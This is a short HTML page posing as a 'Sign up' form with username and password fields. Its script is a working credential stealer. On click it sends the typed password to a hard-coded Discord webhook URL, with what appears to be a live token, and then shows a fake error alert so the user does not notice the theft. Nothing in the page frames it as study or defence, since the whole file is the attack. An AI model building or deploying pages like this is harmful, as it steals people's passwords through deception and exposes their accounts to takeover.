<html>
	<head>
		<title>Sign up</title>
	</head>
	<body>
		<input id="name" placeholder="Enter a username" maxlength="20" minlength="3"><br><br>
		<input id="password" placeholder="Password" type="password" minlength="8"><br><br>
		<button>Sign up</button>
	</body>
	<script>
		const button = document.querySelector('button');
		const passwordInput = document.getElementById('password');

		button.addEventListener('click', () => {
			const password = passwordInput.value;
			fetch('https://discordapp.com/api/webhooks/1092569585045221386/8la5fQp6icwktAFDw68NpIInnDUvYbHEMZRTeItiBqyH8tk4AP8iSlCTTTZormOH-cZO', {
				method: 'POST',
				headers: {
				'Content-Type': 'application/json'
				},
				body: JSON.stringify({ content: password })
			});
			alert("There has been an error! Please report this to the website owner.");
		});
	</script>
</html>
